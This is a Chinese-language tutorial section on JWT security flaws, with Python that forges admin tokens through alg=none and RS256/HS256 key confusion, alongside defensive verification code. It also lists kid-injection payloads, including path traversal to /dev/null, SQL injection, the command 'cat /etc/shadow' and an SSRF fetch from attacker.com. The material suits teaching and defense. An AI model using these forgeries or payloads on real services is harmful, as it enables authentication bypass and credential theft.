# JWT安全漏洞详解

### 8.1 alg=none攻击

```text
alg=none攻击详解

漏洞原理:
  JWT标准允许alg=none（无签名）
  部分JWT库在alg=none时跳过签名验证
  攻击者可以构造任意Payload

攻击步骤:
  1. 获取一个合法JWT
  2. 解码Header: {"alg":"HS256","typ":"JWT"}
  3. 修改Header: {"alg":"none","typ":"JWT"}
  4. 修改Payload: {"sub":"admin","role":"superuser"}
  5. 签名设为空: header.payload.
  6. 发送伪造JWT

防御措施:
  1. 在代码中显式禁止alg=none
  2. 指定允许的算法白名单
  3. 使用更新的JWT库
  4. 永远不信任Header中的alg值
```

```python
import jwt
import base64
import json

class JWTNoneAttack:
    """演示alg=none攻击与防御"""

    @staticmethod
    def create_none_jwt():
        """创建alg=none的JWT"""
        # Header
        header = {"alg": "none", "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()

        # Payload (修改为admin)
        payload = {
            "sub": "admin",
            "role": "superuser",
            "exp": 9999999999  # 远期过期
        }
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()

        # 签名为空
        jwt_token = f"{header_b64}.{payload_b64}."

        return jwt_token

    @staticmethod
    def vulnerable_verify(token, secret):
        """有漏洞的验证（不检查alg）"""
        try:
            # 漏洞: 不指定允许的算法
            payload = jwt.decode(token, secret, options={'verify_exp': False})
            return payload
        except Exception:
            return None

    @staticmethod
    def secure_verify(token, secret):
        """安全的验证"""
        try:
            payload = jwt.decode(
                token,
                secret,
                algorithms=['HS256'],  # 明确指定算法
                options={
                    'verify_exp': True,
                    'verify_signature': True,  # 必须验证签名
                    'require': ['exp', 'iat', 'sub']  # 必需声明
                }
            )
            return payload
        except Exception as e:
            return {'error': str(e)}


def demo_none_attack():
    """alg=none攻击演示"""
    secret = 'my_secret'
    attacker = JWTNoneAttack()

    # 生成alg=none的JWT
    fake_token = attacker.create_none_jwt()
    print(f"伪造JWT: {fake_token[:50]}...")

    # 有漏洞的验证
    result = attacker.vulnerable_verify(fake_token, secret)
    print(f"有漏洞验证: {result}")

    # 安全的验证
    result = attacker.secure_verify(fake_token, secret)
    print(f"安全验证: {result}")


if __name__ == "__main__":
    demo_none_attack()
```

### 8.2 密钥混淆攻击

```text
密钥混淆攻击 (Algorithm Confusion / Key Confusion)

漏洞原理:
  服务端使用RS256(非对称): 私钥签名，公钥验证
  攻击者获取公钥
  将JWT的alg改为HS256(对称)
  用公钥作为HMAC密钥签名
  服务端用公钥验证HS256 → 通过

攻击步骤:
  1. 获取服务端公钥（通常公开）
  2. 修改JWT Header: alg: RS256 → HS256
  3. 修改Payload: 任意内容
  4. 用公钥作为HMAC密钥签名
  5. 发送伪造JWT

防御措施:
  1. 明确指定算法: algorithms=['RS256']
  2. 不要信任Header中的alg
  3. 分离HS256和RS256的密钥
  4. 使用不同的密钥对用于不同算法
```

```python
class KeyConfusionAttack:
    """密钥混淆攻击演示"""

    @staticmethod
    def attack(public_key_pem):
        """
        使用公钥伪造HS256 JWT
        """
        # 获取公钥内容
        public_key_bytes = public_key_pem.encode('utf-8')

        # 构造Header: 声称使用HS256
        header = {"alg": "HS256", "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()

        # 构造Payload
        payload = {"sub": "admin", "role": "superuser"}
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()

        # 用公钥作为HMAC密钥签名
        message = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(public_key_bytes, message, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

        return f"{header_b64}.{payload_b64}.{sig_b64}"

    @staticmethod
    def defense():
        """防御策略"""
        return {
            'strategy_1': '验证时明确指定算法白名单: algorithms=["RS256"]',
            'strategy_2': '不信任JWT Header中的alg字段',
            'strategy_3': '对称和非对称密钥完全分离',
            'strategy_4': '使用jwk_set时验证密钥类型与算法匹配',
            'strategy_5': '使用库的strict模式（如PyJWT的strict_mode）'
        }
```

### 8.3 kid注入攻击

```text
kid注入攻击 (Key ID Injection)

漏洞原理:
  JWT Header中的kid字段用于指定使用哪个密钥
  服务端根据kid从密钥库查找对应密钥
  如果kid处理不当，可能被注入

攻击类型:

1. 目录遍历
   kid: "../../../../dev/null"
   → 使用/dev/null的空内容作为密钥
   → 攻击者用空密钥签名

2. SQL注入
   kid: "key' UNION SELECT 'attacker_secret' --"
   → 注入SQL获取攻击者控制的密钥
   → 攻击者用已知密钥签名

3. 命令注入
   kid: "key; cat /etc/shadow"
   → 可能执行系统命令

4. SSRF
   kid: "http://attacker.com/key"
   → 服务端请求攻击者控制的URL获取密钥

防御措施:
  1. kid白名单验证
  2. kid格式限制（仅字母数字）
  3. 参数化查询
  4. 不从外部URL加载密钥
  5. 使用jku/jwk时验证信任域
```

---

---

## 📋 内容审核与补充建议

> 针对「JWT安全漏洞详解」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
